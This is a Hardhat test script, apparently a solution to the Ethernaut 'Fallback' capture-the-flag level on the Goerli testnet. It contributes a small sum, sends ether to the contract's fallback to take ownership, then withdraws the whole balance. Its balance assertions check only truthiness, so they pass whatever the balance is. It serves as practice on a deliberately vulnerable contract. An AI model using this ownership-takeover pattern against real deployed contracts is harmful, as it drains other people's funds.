import { assert } from "chai"
import {network, ethers} from "hardhat"
import { developmentChains, networkConfig } from "../../helper-hardhat-config"
import { Fallback } from "../../typechain-types"
import abi from "../../artifacts/contracts/Fallback.sol/Fallback.json"
import "dotenv/config"

const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL
const PRIVATE_KEY = String(process.env.PRIVATE_KEY)


developmentChains.includes(network.name)
    ? describe.skip
    : describe("Fallback Hack Staging", function (){
        const MIN_AMOUNT = 1
        let provider:any
        let wallet:any
        const fallbackAddress:string = networkConfig[network.config.chainId!]["contractAddress"]!
        const fallbackABI = abi.abi
        let fallback: Fallback
        let fallbackContract: Fallback
        

        beforeEach(async() => {
            provider =  new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
            wallet  = new ethers.Wallet(PRIVATE_KEY,provider)
            fallbackContract = new ethers.Contract(fallbackAddress,fallbackABI,provider)
            fallback = fallbackContract.connect(wallet)
            
        })  
        describe("Ownership", function() {
            it("You claim ownership of the contract and you reduce its balance to 0", async() => {
                // Insert into contribute list
                let tx1 = await fallback.contribute({value: MIN_AMOUNT})
                tx1.wait()
                console.log(tx1.blockNumber)
                // change the ownership
                let tx2 = await wallet.sendTransaction({
                    to: fallback.address,
                    value: MIN_AMOUNT
                })
                tx2.wait()
                let balance = (await provider.getBalance(fallback.address)).toString()
                assert(balance,"1")
                // Check new owner
                await provider.waitForTransaction(tx2.hash,1,150000)
                let newOwner = await fallback.owner()
                assert.equal(newOwner,wallet.address)
                // you reduce its balance to 0
                let tx3 = await fallback.withdraw()
                tx3.wait()
                balance = (await provider.getBalance(fallback.address)).toString()
                // Check balance to 0
                assert(balance,"0")
            })
        })
    })